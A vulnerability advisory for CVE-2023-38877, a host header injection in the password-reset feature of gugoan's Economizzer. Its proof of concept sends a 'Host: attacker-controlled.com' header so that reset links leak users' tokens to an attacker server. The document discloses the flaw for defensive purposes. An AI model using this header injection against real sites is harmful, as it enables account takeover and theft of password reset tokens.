# CVE-2023-38877: Host Header Injection in Forgot Password of gugoan's Economizzer

A host header injection vulnerability exists in gugoan's Economizzer commit 3730880 (April 2023). By sending a specially crafted host header in the reset password request, it is possible to send password reset links to users which, once clicked, lead to an attacker-controlled server and thus leak the password reset token. This allows an attacker to reset other users' passwords.

PoC:

- We trigger the forgot password functionality for an existing user, such as `bob@email.com`, and provide a malicious host header: `Host: attacker-controlled.com`
- This sends a password reset email to `bob@email.com` with a reset link like `https://attacker-controlled.com/user/reset?key=<reset-token>` (note the host being `attacker-controlled.com`)
- When `bob` clicks the link, the password reset token is leaked to the attacker which would allow resetting `bob's` password and taking over his account

Discovered by Florian Walter, July 2023.

References:

- https://nvd.nist.gov/vuln/detail/CVE-2023-38877
- https://www.cve.org/CVERecord?id=CVE-2023-38877
